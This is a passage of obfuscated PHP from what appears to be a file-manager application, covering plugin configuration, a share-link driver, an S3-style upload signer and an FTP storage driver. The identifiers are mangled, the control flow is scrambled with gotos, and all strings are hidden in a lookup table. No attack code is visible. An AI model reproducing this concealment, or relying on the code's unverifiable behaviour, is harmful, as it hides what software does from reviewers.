$this->update($D¨›ô¼À‰Ò[$d­ìŒ…Ë‘[371]], array($d­ìŒ…Ë‘[2225] => $b­ù…†‡Åğ)); } else { $FŠï„¡ªÚ’ = array($d­ìŒ…Ë‘[28] => $dÎ¡»Î—’¤, $d­ìŒ…Ë‘[2225] => $b­ù…†‡Åğ, $d­ìŒ…Ë‘[694] => 0, $d­ìŒ…Ë‘[6] => $this->getConfigDefault($dÎ¡»Î—’¤)); $this->insert($FŠï„¡ªÚ’); } } public function getConfigDefault($cÄ–éØéî„) { $b·¤ÜŸí‰Õ =& $_SERVER[…Ò×–]; $fëÄ‡İ‚š§ = array(); $Dëè›Ïã‘³ = $this->getPackageJson($cÄ–éØéî„); if (!$Dëè›Ïã‘³ && is_array($Dëè›Ïã‘³[$b·¤ÜŸí‰Õ[2232]])) { return $fëÄ‡İ‚š§; } foreach ($Dëè›Ïã‘³[$b·¤ÜŸí‰Õ[2232]] as $eù§Û½¥Ü => $D•¸Êëä²Ÿ) { if (!isset($D•¸Êëä²Ÿ[$b·¤ÜŸí‰Õ[363]]) || isset($fëÄ‡İ‚š§[$eù§Û½¥Ü])) { continue; } $fëÄ‡İ‚š§[$eù§Û½¥Ü] = $D•¸Êëä²Ÿ[$b·¤ÜŸí‰Õ[363]]; } return $fëÄ‡İ‚š§; } public function getPackageJson($eî¥ˆòšæ²) { return Hook::apply($eî¥ˆòšæ² . $_SERVER[…Ò×–][2233]); } public function getConfig($eä¤©ƒÉÒ•, $BÛ©ñÙ×ˆñ = false) { $E»ØÎ‘°›Ç =& $_SERVER[…Ò×–]; $Cß¶ŠÔ…•Š = array(); $b¥Ô¾‘Ê˜¿ = $this->loadList($eä¤©ƒÉÒ•); if ($b¥Ô¾‘Ê˜¿ && is_array($b¥Ô¾‘Ê˜¿[$E»ØÎ‘°›Ç[6]])) { $Cß¶ŠÔ…•Š = $b¥Ô¾‘Ê˜¿[$E»ØÎ‘°›Ç[6]]; } if (!$Cß¶ŠÔ…•Š || $BÛ©ñÙ×ˆñ) { $Cß¶ŠÔ…•Š = $this->getConfigDefault($eä¤©ƒÉÒ•); } return $Cß¶ŠÔ…•Š; } public function setConfig($f˜†±Ø³Ú‰, $b‚â°ÍÀåÙ = false) { goto C¯¢Ûá‡; f£—¶ô‚É†: $this->update($eÀâ–™‹šá[$C¶—¸³³ğ[371]], array($C¶—¸³³ğ[6] => $Bª‚•ƒÆ¢)); goto EáƒéÊæÔ; C¯¢Ûá‡: $C¶—¸³³ğ =& $_SERVER[…Ò×–]; $eÀâ–™‹šá = $this->loadList($f˜†±Ø³Ú‰); if (!$eÀâ–™‹šá) { return !1; } goto f•ÆËíëß; f•ÆËíëß: $Bª‚•ƒÆ¢ = $eÀâ–™‹šá[$C¶—¸³³ğ[6]]; if ($b‚â°ÍÀåÙ == !1) { $Bª‚•ƒÆ¢ = array(); $b‚â°ÍÀåÙ = $this->getConfigDefault($f˜†±Ø³Ú‰); } foreach ($b‚â°ÍÀåÙ as $Aª”ÑÍ—Šö => $AÏ˜Éøİø£) { $Bª‚•ƒÆ¢[$Aª”ÑÍ—Šö] = is_string($AÏ˜Éøİø£) ? trim($AÏ˜Éøİø£) : $AÏ˜Éøİø£; } goto f£—¶ô‚É†; EáƒéÊæÔ: } public function viewList() { goto BŞ£ñ–—°Ş; fì‚ÃåĞ…æ: $aï—ÇËİÕ¡ = $this->loadPluginList(); $Eš•¸¸í® = array(); foreach ($aï—ÇËİÕ¡ as $CóĞ¸„ËêŒ => $f¿ÜÎÚ˜ªÎ) { unset($f¿ÜÎÚ˜ªÎ[$b‘ŞÙÄ‘œ†[2225]], $f¿ÜÎÚ˜ªÎ[$b‘ŞÙÄ‘œ†[6]]); $DĞ¼Ò‹ğÑ® = PLUGIN_DIR . $f¿ÜÎÚ˜ªÎ[$b‘ŞÙÄ‘œ†[28]] . $b‘ŞÙÄ‘œ†[2227]; if (!is_file($DĞ¼Ò‹ğÑ®)) { continue; } $då®Ø†èã = Hook::apply($f¿ÜÎÚ˜ªÎ[$b‘ŞÙÄ‘œ†[28]] . $b‘ŞÙÄ‘œ†[2233]); if (is_array($då®Ø†èã)) { $Eš•¸¸í®[$CóĞ¸„ËêŒ] = array_merge($f¿ÜÎÚ˜ªÎ, $då®Ø†èã); } } goto AÂ•ÑÒ˜—›; AÂ•ÑÒ˜—›: return $Eš•¸¸í®; goto bÂğ…Ç×÷; BŞ£ñ–—°Ş: $b‘ŞÙÄ‘œ† =& $_SERVER[…Ò×–]; $aï—ÇËİÕ¡ = $this->loadList(); $this->pluginScan($aï—ÇËİÕ¡); goto fì‚ÃåĞ…æ; bÂğ…Ç×÷: } private function loadPluginList() { $A…Ÿæ¡äŞ =& $_SERVER[…Ò×–]; $Dù¾©ùÂ¶ = $this->loadList(); if (strtolower(MOD) == $A…Ÿæ¡äŞ[2234]) { return $Dù¾©ùÂ¶; } $eµğ²à“Áï = Hook::trigger($A…Ÿæ¡äŞ[2235], $Dù¾©ùÂ¶); if ($Dù¾©ùÂ¶ && !$eµğ²à“Áï) { die; } return $eµğ²à“Áï ? $eµğ²à“Áï : $Dù¾©ùÂ¶; } private function pluginScan($a¼°«Ãè…Ë) { $EÉ¶¨˜Ì² =& $_SERVER[…Ò×–]; recursion_dir(PLUGIN_DIR, $bÍ½ÑÑ¸Ñ, $FÈ„¶ñ‹İè, 0); foreach ($bÍ½ÑÑ¸Ñ as $aåÉË‰±Ô¾) { $e“©£ÆÜ‹ = get_path_this($aåÉË‰±Ô¾); if (isset($a¼°«Ãè…Ë[$e“©£ÆÜ‹]) || !file_exists($aåÉË‰±Ô¾ . $EÉ¶¨˜Ì²[2236]) || !file_exists($aåÉË‰±Ô¾ . $EÉ¶¨˜Ì²[2227])) { continue; } Hook::apply($e“©£ÆÜ‹ . $EÉ¶¨˜Ì²[2230]); } } } goto aÌèÎù¬¾Ï; B¶ÅÛ÷ç“˜: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($fåóÜÔòƒß) { $this->pathParse = $fåóÜÔòƒß; } protected function infoParse($cåİŒ°‡‡„, $CÜôÇÄäÁİ = false) { $e‡“ƒº°ğÕ =& $_SERVER[…Ò×–]; return Action($e‡“ƒº°ğÕ[1029])->sharePathInfo($this->pathParse[$e‡“ƒº°ğÕ[75]], !0, $CÜôÇÄäÁİ); } public function listPath($B›Ç­ÕãÎİ, $ašîœ¬…”À = false) { $Dâ½ÎáÃª½ =& $_SERVER[…Ò×–]; $aßæ³àçÅ = IO::listPath($B›Ç­ÕãÎİ, $ašîœ¬…”À); foreach ($aßæ³àçÅ as $Cğ¯íºœÍ± => $cµ¤—‹…™Á) { if (!in_array($Cğ¯íºœÍ±, array($Dâ½ÎáÃª½[73], $Dâ½ÎáÃª½[74]))) { continue; } foreach ($cµ¤—‹…™Á as $C¤÷Êé´ => $Bè‡ŒÑ“Ûí) { $Bè‡ŒÑ“Ûí = Action($Dâ½ÎáÃª½[1146])->parsePathChildren($Bè‡ŒÑ“Ûí, array($Dâ½ÎáÃª½[391] => $B›Ç­ÕãÎİ)); $aßæ³àçÅ[$Cğ¯íºœÍ±][$C¤÷Êé´] = Action($Dâ½ÎáÃª½[1029])->shareItemInfo($Bè‡ŒÑ“Ûí); } } return $aßæ³àçÅ; } public function listAll($B±ÎÃÊ«÷É) { $d¹Ê‘¢… =& $_SERVER[…Ò×–]; $a¡¾¦Ù…í÷ = IO::listAll($B±ÎÃÊ«÷É); foreach ($a¡¾¦Ù…í÷ as &$bºô›¿å­½) { $bºô›¿å­½ = array_merge(IO::info($bºô›¿å­½[$d¹Ê‘¢…[75]]), $bºô›¿å­½); $bºô›¿å­½[$d¹Ê‘¢…[395]] = Action($d¹Ê‘¢…[1029])->shareItemInfo($bºô›¿å­½); } unset($bºô›¿å­½); return $a¡¾¦Ù…í÷; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($e¼Ñ¼˜ñÂí) { parent::__construct($e¼Ñ¼˜ñÂí); $this->signatureVersion($_SERVER[…Ò×–][204]); } public function uploadFormData($A‰«Î×¿›, $dÔ¿Ù‚ÂùŒ = 3600) { goto a°°‚¤‡Â¢; a¶ÑÎàù³: $bÏ±ïîË¯» = array($this->accessKey, $cåØ†«‚›æ, $this->region, $B†ÉñŞ«Àé, $BÅ²ˆ¬ìÓ±); $AáŞö®² = implode($aÀèÏ¦³‹³[8], $bÏ±ïîË¯»); $D‚–¬Éİà² = array($aÀèÏ¦³‹³[1112] => gmdate($aÀèÏ¦³‹³[1111], strtotime($aÀèÏ¦³‹³[1150])), $aÀèÏ¦³‹³[1113] => array(array($aÀèÏ¦³‹³[1115] => $this->bucket), array($aÀèÏ¦³‹³[1114] => $AæÅİ†‰™ì), array($aÀèÏ¦³‹³[1116], $aÀèÏ¦³‹³[1117], $aÀèÏ¦³‹³[33]), array($aÀèÏ¦³‹³[1116], $aÀèÏ¦³‹³[1151], $aÀèÏ¦³‹³[33]), array($aÀèÏ¦³‹³[1116], $aÀèÏ¦³‹³[1152], $aÀèÏ¦³‹³[33]), array($aÀèÏ¦³‹³[1118] => $a«õ—¿ˆï¶), array($aÀèÏ¦³‹³[1153] => $AáŞö®²), array($aÀèÏ¦³‹³[1154] => $eëÂöâãœÒ), array($aÀèÏ¦³‹³[1155] => $d°à»ÆË›), array($aÀèÏ¦³‹³[1156] => $F¸­ºÂâïÄ))); goto F“äöğââé; E™Áë‰”: $BÅ²ˆ¬ìÓ± = $aÀèÏ¦³‹³[1149]; $F¸­ºÂâïÄ = $dÔ¿Ù‚ÂùŒ . $aÀèÏ¦³‹³[33]; $a«õ—¿ˆï¶ = $aÀèÏ¦³‹³[1110]; goto a¶ÑÎàù³; BùŞ‹Ê¼†¯: $Aã÷º«Áêö = hash_hmac($aÀèÏ¦³‹³[1157], $B†ÉñŞ«Àé, $dÆ¶ô’ß—™, !0); $béÖæÉ»Œ = hash_hmac($aÀèÏ¦³‹³[1157], $BÅ²ˆ¬ìÓ±, $Aã÷º«Áêö, !0); $B¡Ï¸é¡Š¸ = hash_hmac($aÀèÏ¦³‹³[1157], $cêÉõªª¹’, $béÖæÉ»Œ); goto DíÅëª×Ã; F“äöğââé: $cêÉõªª¹’ = base64_encode(json_encode($D‚–¬Éİà²)); $D…ÇĞòô›è = hash_hmac($aÀèÏ¦³‹³[1157], $cåØ†«‚›æ, $aÀèÏ¦³‹³[1158] . $this->secret, !0); $dÆ¶ô’ß—™ = hash_hmac($aÀèÏ¦³‹³[1157], $this->region, $D…ÇĞòô›è, !0); goto BùŞ‹Ê¼†¯; DíÅëª×Ã: $aÖÙƒ›ÁµÏ = array($aÀèÏ¦³‹³[203] => $aÀèÏ¦³‹³[33], $aÀèÏ¦³‹³[1159] => $aÀèÏ¦³‹³[33], $aÀèÏ¦³‹³[1114] => $AæÅİ†‰™ì, $aÀèÏ¦³‹³[1118] => $a«õ—¿ˆï¶, $aÀèÏ¦³‹³[1122] => $cêÉõªª¹’, $aÀèÏ¦³‹³[1160] => $AáŞö®², $aÀèÏ¦³‹³[1161] => $eëÂöâãœÒ, $aÀèÏ¦³‹³[1162] => $d°à»ÆË›, $aÀèÏ¦³‹³[1163] => $F¸­ºÂâïÄ, $aÀèÏ¦³‹³[1164] => $B¡Ï¸é¡Š¸, $aÀèÏ¦³‹³[173] => $this->getHost()); return $aÖÙƒ›ÁµÏ; goto DÃ‚ó¶ù¨; añ—êËõß: $B†ÉñŞ«Àé = $aÀèÏ¦³‹³[59]; $d°à»ÆË› = gmdate($aÀèÏ¦³‹³[1148]); $cåØ†«‚›æ = gmdate($aÀèÏ¦³‹³[695]); goto E™Áë‰”; a°°‚¤‡Â¢: $aÀèÏ¦³‹³ =& $_SERVER[…Ò×–]; $AæÅİ†‰™ì = $aÀèÏ¦³‹³[189]; $eëÂöâãœÒ = $aÀèÏ¦³‹³[1147]; goto añ—êËõß; DÃ‚ó¶ù¨: } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($D»„“ÚîÑø) { parent::__construct(); if (count($D»„“ÚîÑø) > 0) { $this->_init($D»„“ÚîÑø); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($b·Şñ°Ö®£) { $CŒÈÉéœñ =& $_SERVER[…Ò×–]; global $config; $this->appCharset = $config[$CŒÈÉéœñ[1165]]; $this->systemCharset = $config[$CŒÈÉéœñ[1166]]; if (isset($b·Şñ°Ö®£[$CŒÈÉéœñ[1167]]) && $b·Şñ°Ö®£[$CŒÈÉéœñ[1167]]) { $this->systemCharset = $b·Şñ°Ö®£[$CŒÈÉéœñ[1167]]; } } public function iconvApp($bÀˆæ•Î¹·) { return $this->iconvTo($bÀˆæ•Î¹·, $this->systemCharset, $this->appCharset); } public function iconvSystem($c£‘Ö‹Ç¸) { return $this->iconvTo($c£‘Ö‹Ç¸, $this->appCharset, $this->systemCharset); } public function getPathOuter($D¥éœ¦Ä×) { goto EŠçÇù¤™‰; EŠçÇù¤™‰: $C²âùÎÄÎ =& $_SERVER[…Ò×–]; $aõ¢Š£”øÇ = $this->iconvApp($this->pathBase); $D¥éœ¦Ä× = $this->iconvApp($D¥éœ¦Ä×); goto C”óÕ·ºŞ–; A–ñ»èØ©›: return $this->pathDriver . $C²âùÎÄÎ[8] . ltrim($D¥éœ¦Ä×, $C²âùÎÄÎ[8]); goto F†Åè‡Œªå; D¡œ„ÚĞ´©: $D¥éœ¦Ä× = KodIO::clear($D¥éœ¦Ä×); $D¥éœ¦Ä× = substr($D¥éœ¦Ä×, strlen($aõ¢Š£”øÇ)); if (empty($this->pathDriver)) { return $D¥éœ¦Ä×; } goto A–ñ»èØ©›; C”óÕ·ºŞ–: if (substr($aõ¢Š£”øÇ, 0, 2) == $C²âùÎÄÎ[1168]) { $aõ¢Š£”øÇ = BASIC_PATH . substr($aõ¢Š£”øÇ, 2); } if (substr($D¥éœ¦Ä×, 0, 2) == $C²âùÎÄÎ[1168]) { $D¥éœ¦Ä× = BASIC_PATH . substr($D¥éœ¦Ä×, 2); } $aõ¢Š£”øÇ = KodIO::clear($aõ¢Š£”øÇ); goto D¡œ„ÚĞ´©; F†Åè‡Œªå: } private function _init($CŠÃà°¢™ = array()) { $b«†Ä–×‡‡ =& $_SERVER[…Ò×–]; if (!function_exists($b«†Ä–×‡‡[1169])) { throw new Exception(LNG($b«†Ä–×‡‡[1170])); } $this->config = $CŠÃà°¢™; $this->charsetReset($CŠÃà°¢™); foreach ($CŠÃà°¢™ as $DæóîÃ­‘« => $BäŸ¢ÒËê‰) { if (isset($this->{$DæóîÃ­‘«})) { $this->{$DæóîÃ­‘«} = $BäŸ¢ÒËê‰; } } return $this->_login($CŠÃà°¢™); } private function _login($F¢’Í–¨Ò) { goto DáĞĞšâ×; B¬ˆ´·Ãá»: $D¿ÒøõÀ“– = isset($DÅŠ¿—×ø[$A¡ìÅ©³½Û[172]]) && $DÅŠ¿—×ø[$A¡ìÅ©³½Û[172]] == $A¡ìÅ©³½Û[1171] ? !0 : !1; $this->scheme = $D¿ÒøõÀ“– ? $A¡ìÅ©³½Û[1172] : $A¡ìÅ©³½Û[1173]; $this->port = isset($DÅŠ¿—×ø[$A¡ìÅ©³½Û[174]]) ? $DÅŠ¿—×ø[$A¡ìÅ©³½Û[174]] : 21; goto AÄ‘¸†‚¢ò; AÄ‘¸†‚¢ò: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $a¥©ßæô¨ = @ftp_login($this->connect, $this->username, $this->userpass); goto d¤å…¬Ë†™; aÖÎŠ•ëª²: $A÷‚ùô•À[$AÜ§¿ñª‰·] = array($A¡ìÅ©³½Û[1174] => $this->connect, $A¡ìÅ©³½Û[173] => $this->host, $A¡ìÅ©³½Û[172] => $this->scheme, $A¡ìÅ©³½Û[174] => $this->port); return $a¥©ßæô¨; goto E¶ ÆÕ’…ğ; d¤å…¬Ë†™: @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $eš¼àÌÄ‹— = $this->pasv == $A¡ìÅ©³½Û[83] ? !0 : !1; @ftp_pasv($this->connect, $eš¼àÌÄ‹—); goto aÖÎŠ•ëª²; DáĞĞšâ×: $A¡ìÅ©³½Û =& $_SERVER[…Ò×–]; static $A÷‚ùô•À = array(); $AÜ§¿ñª‰· = md5(json_encode($F¢’Í–¨Ò)); goto D‘†¯Á˜©Ã; D‘†¯Á˜©Ã: if (isset($A÷‚ùô•À[$AÜ§¿ñª‰·])) { foreach ($A÷‚ùô•À[$AÜ§¿ñª‰·] as $eˆÔ“Û¡©ó => $B‰ç‚²­Š) { $this->{$eˆÔ“Û¡©ó} = $B‰ç‚²­Š; } return !0; } $DÅŠ¿—×ø = parse_url(trim($this->server, $A¡ìÅ©³½Û[8])); $this->host = $DÅŠ¿—×ø[$A¡ìÅ©³½Û[173]]; goto B¬ˆ´·Ãá»; E¶ ÆÕ’…ğ: } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($E°ÖÚ‚‹î, $E»ÉÃß•Ğ¸ = '', $AÖÅ¸È‘ä = REPEAT_RENAME) { if ($this->setContent($E°ÖÚ‚‹î, $E»ÉÃß•Ğ¸)) { return $this->getPathOuter($E°ÖÚ‚‹î); } return !1; } public function mkdir($bê¦³ªğ , $b³†·ÁÎ¼ô = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $bê¦³ªğ  = $this->iconvSystem($bê¦³ªğ ); if ($this->isFolder($bê¦³ªğ ) || @ftp_mkdir($this->connect, $bê¦³ªğ )) { return $this->getPathOuter($bê¦³ªğ ); } if (!$this->mkdir($this->pathFather($bê¦³ªğ ))) { return !1; } if ($bê¦³ªğ  = @ftp_mkdir($this->connect, $bê¦³ªğ )) { return $this->getPathOuter($bê¦³ªğ ); } return !1; } public function copyFile($F¿ÄÄí¬, $bÀéÆõ±¹„) { goto e°›™–„ö; F„ŠÓÃˆÉŒ: $this->tempFileRemve($Bá‡²ÓÙÃÁ); return $F¼˜¬ÊÃÑò; goto D¤Ëˆ‘Šƒ; F¦ß‡”‹’ƒ: $f‡Ş™›¸ŞÛ = $this->iconvApp($Bá‡²ÓÙÃÁ); $this->download($F¿ÄÄí¬, $f‡Ş™›¸ŞÛ); $F¼˜¬ÊÃÑò = $this->upload($bÀéÆõ±¹„, $f‡Ş™›¸ŞÛ); goto F„ŠÓÃˆÉŒ; e°›™–„ö: if (!$this->_isconn()) { return !1; } $c‚£ìÀ—£– = $this->pathThis($this->iconvSystem($F¿ÄÄí¬)); $Bá‡²ÓÙÃÁ = $this->tempFile($c‚£ìÀ—£–); goto F¦ß‡”‹’ƒ; D¤Ëˆ‘Šƒ: } public function moveFile($CÀ×Ğ×ù·ğ, $Aˆ’’…£ß) { if (!$this->_isconn()) { return !1; } $CÀ×Ğ×ù·ğ = $this->iconvSystem($CÀ×Ğ×ù·ğ); $Aˆ’’…£ß = $this->iconvSystem($Aˆ’’…£ß); $c£ÂìÊíã· = @ftp_rename($this->connect, $CÀ×Ğ×ù·ğ, $Aˆ’’…£ß); return $c£ÂìÊíã· ? $this->getPathOuter($Aˆ’’…£ß) : !1; } public function delFile($BÎ“‘İ›â) { if (!$this->_isconn()) { return !1; } $BÎ“‘İ›â = $this->iconvSystem($BÎ“‘İ›â); return @ftp_delete($this->connect, $BÎ“‘İ›â); } public function delFolder($d‹áÈâŸ¬Ê) { if (!$this->_isconn()) { return !1; } $d‹áÈâŸ¬Ê = $this->iconvSystem($d‹áÈâŸ¬Ê); $dÓ¬©Æ¹Œ° = $this->ftpList($d‹áÈâŸ¬Ê); if (!$dÓ¬©Æ¹Œ°) { return @ftp_rmdir($this->connect, $d‹áÈâŸ¬Ê); } foreach ($dÓ¬©Æ¹Œ° as $D§è”ÙÄ†Ï) { if ($this->isFolder($D§è”ÙÄ†Ï)) { $D§è”ÙÄ†Ï = $this->iconvApp($D§è”ÙÄ†Ï); $this->delFolder($D§è”ÙÄ†Ï); } else { @ftp_delete($this->connect, $D§è”ÙÄ†Ï); } } return @ftp_rmdir($this->connect, $d‹áÈâŸ¬Ê); } public function rename($DÃõêïŠì, $A­–‚åÁ) { goto A§×¤£®´×; A§×¤£®´×: $f‡Ç¹íòø³ =& $_SERVER[…Ò×–]; if (!$this->_isconn()) { return !1; } $CÀÛ¦ĞÑŞÖ = $this->fileNameAuto($this->pathFather($DÃõêïŠì), $A­–‚åÁ); goto AõÃÄññ“Ÿ; AõÃÄññ“Ÿ: $CÀÛ¦ĞÑŞÖ = $this->iconvSystem($CÀÛ¦ĞÑŞÖ); $DÃõêïŠì = $this->iconvSystem($DÃõêïŠì); $A·õ‹„‘ŒÁ = $this->pathFather($DÃõêïŠì); goto C¾ÎÃ¢µñò; A áØŸ¤ÈÚ: return $EÚùˆäÆ°¿ ? $this->getPathOuter($b“˜Øğñ‡Â) : !1; goto E»±ëÛ©†Ä; C¾ÎÃ¢µñò: $b“˜Øğñ‡Â = rtrim($A·õ‹„‘ŒÁ, $f‡Ç¹íòø³[8]) . $f‡Ç¹íòø³[8] . $CÀÛ¦ĞÑŞÖ; $EÚùˆäÆ°¿ = @ftp_rename($this->connect, $DÃõêïŠì, $b“˜Øğñ‡Â); $b“˜Øğñ‡Â = $this->iconvApp($b“˜Øğñ‡Â); goto A áØŸ¤ÈÚ; E»±ëÛ©†Ä: } private function folderInfo($cŸÖ„öÛßµ, $f§Œãƒ·Úó = false) { goto d¨ªø‘à¾; d¨ªø‘à¾: $bµƒ»…ß®É =& $_SERVER[…Ò×–]; $B–ëÀ×ÀÜ = $this->getPathOuter(rtrim($cŸÖ„öÛßµ, $bµƒ»…ß®É[8])); $b›‡œ³àÅ = $this->pathThis($B–ëÀ×ÀÜ); goto Fï“ÕÀŸ‰; Fï“ÕÀŸ‰: $B±ñ¤á´ = $this->iconvSystem($cŸÖ„öÛßµ); if ($f§Œãƒ·Úó) { return array($bµƒ»…ß®É[28] => $b›‡œ³àÅ, $bµƒ»…ß®É[75] => $B–ëÀ×ÀÜ, $bµƒ»…ß®É[29] => $bµƒ»…ß®É[76]); } $B‘ç…Ãöš¶ = array($bµƒ»…ß®É[28] => $b›‡œ³àÅ, $bµƒ»…ß®É[75] => $B–ëÀ×ÀÜ, $bµƒ»…ß®É[29] => $bµƒ»…ß®É[76], $bµƒ»…ß®É[191] => 0, $bµƒ»…ß®É[107] => 0, $bµƒ»…ß®É[1175] => !0, $bµƒ»…ß®É[1176] => !0); goto d…©ô§ØÂ«; d…©ô§ØÂ«: return $B‘ç…Ãöš¶; goto B†–˜Üí; B†–˜Üí: } private function fileInfo($Fñ–Ÿ×ø©á, $dæåö¹„¿Ó = false) { goto fÆì”Á™­Ì; D§®¥­Œë±: $B¦¦ª™…‡Ë = $this->iconvSystem($Fñ–Ÿ×ø©á); if ($dæåö¹„¿Ó) { return array($bê¥²°ğ[28] => $E¬Á£Éâë, $bê¥²°ğ[75] => $A§–¹óÌÜÆ, $bê¥²°ğ[29] => $bê¥²°ğ[171], $bê¥²°ğ[165] => $this->ext($Fñ–Ÿ×ø©á), $bê¥²°ğ[77] => $this->size($Fñ–Ÿ×ø©á)); } $E¥ö‰‚ËéŠ = array($bê¥²°ğ[28] => $E¬Á£Éâë, $bê¥²°ğ[75] => $A§–¹óÌÜÆ, $bê¥²°ğ[29] => $bê¥²°ğ[171], $bê¥²°ğ[191] => 0, $bê¥²°ğ[107] => @ftp_mdtm($this->connect, $B¦¦ª™…‡Ë), $bê¥²°ğ[165] => $this->ext($Fñ–Ÿ×ø©á), $bê¥²°ğ[77] => $this->size($Fñ–Ÿ×ø©á), $bê¥²°ğ[1175] => !0, $bê¥²°ğ[1176] => !0); goto eö¸ññ™—‘; fÆì”Á™­Ì: $bê¥²°ğ =& $_SERVER[…Ò×–]; $A§–¹óÌÜÆ = $this->getPathOuter(rtrim($Fñ–Ÿ×ø©á, $bê¥²°ğ[8])); $E¬Á£Éâë = $this->pathThis($A§–¹óÌÜÆ); goto D§®¥­Œë±; eö¸ññ™—‘: $E¥ö‰‚ËéŠ[$bê¥²°ğ[107]] = $E¥ö‰‚ËéŠ[$bê¥²°ğ[107]] > 0 ? $E¥ö‰‚ËéŠ[$bê¥²°ğ[107]] : 0; return $E¥ö‰‚ËéŠ; goto eÖÊùä™¬ù; eÖÊùä™¬ù: } public function size($Dì„‰ËÓ) { $eŞÖ£œÙ¤‚ = $this->objectMeta($Dì„‰ËÓ); return $eŞÖ£œÙ¤‚ ? $eŞÖ£œÙ¤‚[$_SERVER[…Ò×–][77]] : 0; } public function info($DÉ…Íº•î) { if ($this->isFile($DÉ…Íº•î)) { return $this->fileInfo($DÉ…Íº•î, 0); } else { if ($this->isFolder($DÉ…Íº•î)) { return $this->folderInfo($DÉ…Íº•î); } } return !1; } public function exist($A™†“Ã™ïº) { return $this->objectMeta($A™†“Ã™ïº) ? !0 : !1; } public function isFile($d¶ŠÇæÓ„¿) { $B¼ÊğŸ¾Š° =& $_SERVER[…Ò×–]; $cİªÅÈ©åİ = $this->objectMeta($d¶ŠÇæÓ„¿); return $cİªÅÈ©åİ ? $cİªÅÈ©åİ[$B¼ÊğŸ¾Š°[29]] == $B¼ÊğŸ¾Š°[171] : !1; } public function isFolder($fñÂÚË òƒ) { $FÙÏÕ³¯¥™ =& $_SERVER[…Ò×–]; $b¬®‚ñŞˆ = $this->objectMeta($fñÂÚË òƒ); return $b¬®‚ñŞˆ ? $b¬®‚ñŞˆ[$FÙÏÕ³¯¥™[29]] == $FÙÏÕ³¯¥™[76] : !1; } public function listPath($cÁëÛ†ó³‹, $cĞ‡Ìˆ¹Ÿ« = false) { goto DÇöõ‘ïÃÄ; eÜÔé˜ÜÌƒ: $cóƒçƒóâ = $this->ftpList($cÁëÛ†ó³‹); $EØœ ‰…ñˆ = array($D´…™áÁˆß[74] => array(), $D´…™áÁˆß[73] => array()); if (!$cóƒçƒóâ) { return $EØœ ‰…ñˆ; } goto fÅò×†ìÄ ; fÅò×†ìÄ : foreach ($cóƒçƒóâ as $cÁëÛ†ó³‹) { if ($this->isFolder($cÁëÛ†ó³‹)) { $EØœ ‰…ñˆ[$D´…™áÁˆß[74]][] = $this->folderInfo($cÁëÛ†ó³‹, $cĞ‡Ìˆ¹Ÿ«); } else { $EØœ ‰…ñˆ[$D´…™áÁˆß[73]][] = $this->fileInfo($cÁëÛ†ó³‹, $cĞ‡Ìˆ¹Ÿ«); } } return $EØœ ‰…ñˆ; goto bĞ“É¡‘š; DÇöõ‘ïÃÄ: $D´…™áÁˆß =& $_SERVER[…Ò×–]; if (!$this->_isconn()) { return !1; } $cÁëÛ†ó³‹ = $this->iconvSystem($cÁëÛ†ó³‹); goto eÜÔé˜ÜÌƒ; bĞ“É¡‘š: } public function has($bÑ÷‹®¦·ª, $Dñ¥ÔÆò˜Â = false, $b‚èº¤áå = true) { goto Fñæ’ö¦ Š; DáŸˆ°Ï½¸: foreach ($Aëæ ¾º’ as $bÑ÷‹®¦·ª) { if ($b‚èº¤áå) { if (!$this->isFolder($bÑ÷‹®¦·ª)) { return !0; } } else { if ($this->isFolder($bÑ÷‹®¦·ª)) { return !0; } } } return !1; goto CïİÊ¾ÄÍ; bÄÔ‘÷¢˜: $Aëæ ¾º’ = $this->ftpList($bÑ÷‹®¦·ª); if (!$Aëæ ¾º’) { return !1; } if ($Dñ¥ÔÆò˜Â) { return array($Fß¨…‡ƒÑ²[195] => 0, $Fß¨…‡ƒÑ²[196] => count($Aëæ ¾º’)); } goto DáŸˆ°Ï½¸; Fñæ’ö¦ Š: $Fß¨…‡ƒÑ² =& $_SERVER[…Ò×–]; if (!$this->_isconn()) { return !1; } $bÑ÷‹®¦·ª = $this->iconvSystem($bÑ÷‹®¦·ª); goto bÄÔ‘÷¢˜; CïİÊ¾ÄÍ: } public function listAll($Aùõæ—­) { goto A·Üç“³²È; f´’Ñ·ÙÃ: $f©ì²Ìô½ = array($bØŠäŒ¢Í[73] => array(), $bØŠäŒ¢Í[74] => array()); $this->recursionFtpFiles($Aùõæ—­, $f©ì²Ìô½); $AÒùæÌôÜŞ = array(); goto b—ªŞ×¾…ª; A·Üç“³²È: $bØŠäŒ¢Í =& $_SERVER[…Ò×–]; if (!$this->_isconn()) { return !1; } $Aùõæ—­ = $this->iconvSystem($Aùõæ—­); goto f´’Ñ·ÙÃ; b—ªŞ×¾…ª: foreach ($f©ì²Ìô½[$bØŠäŒ¢Í[74]] as $D—ÖªœÆÆÄ) { $AÒùæÌôÜŞ[] = array($bØŠäŒ¢Í[75] => $bØŠäŒ¢Í[8] . trim(str_replace($Aùõæ—­, $bØŠäŒ¢Í[33], $D—ÖªœÆÆÄ), $bØŠäŒ¢Í[8]) . $bØŠäŒ¢Í[8], $bØŠäŒ¢Í[76] => 1, $bØŠäŒ¢Í[77] => 0); } foreach ($f©ì²Ìô½[$bØŠäŒ¢Í[73]] as $AùİÂ÷Æ—) { $AÒùæÌôÜŞ[] = array($bØŠäŒ¢Í[75] => $bØŠäŒ¢Í[8] . trim(str_replace($Aùõæ—­, $bØŠäŒ¢Í[33], $AùİÂ÷Æ—), $bØŠäŒ¢Í[8]), $bØŠäŒ¢Í[76] => 0, $bØŠäŒ¢Í[77] => $this->size($AùİÂ÷Æ—)); } return $AÒùæÌôÜŞ; goto EŒùº†„µ£; EŒùº†„µ£: } public function getContent($Fêó­èóá) { if (!$this->_isconn()) { return !1; } $Fêó­èóá = $this->iconvSystem($Fêó­èóá); return $this->fileSubstr($Fêó­èóá); } public function setContent($BĞò÷àñ, $e½è™†× = '') { goto dµéæˆª·; dµéæˆª·: if 